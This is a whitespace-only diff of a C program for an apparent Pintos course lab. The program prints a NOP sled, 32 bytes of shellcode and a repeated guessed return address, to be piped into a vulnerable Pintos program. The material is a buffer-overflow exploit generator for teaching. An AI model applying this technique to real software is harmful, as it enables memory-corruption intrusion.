@@ -3,7 +3,7 @@
    Program to generate a noop sled with accompanying shellcode and a
    good guess as of where all of this data ends up when a buffer
    overflow is exploited in pintos.
- 
+
    This program runs outside pintos. Pipe the output to a pintos
    program with faulty buffer handling to exploit a buffer overflow.
 
@@ -25,13 +25,13 @@ unsigned guess = 0xc0000000 - 2000 - 300;
 int main() //int argc, char* argv[])
 {
   int i;
-  
+
   for (i = 0; i < 128; ++i)
     printf("%c", x86_nop);
 
   for (i = 0; i < 32; ++i)
     printf("%c", shellcode[i]);
-    
+
   for (i = 0; i < (128-32)/4; ++i)
   {
     char* g = (char*)&guess;
@@ -39,6 +39,6 @@ int main() //int argc, char* argv[])
     printf("%c", g[2]);
     printf("%c", g[1]);
     printf("%c", g[0]);
-  }    
+  }
   printf("\n\n");
 }
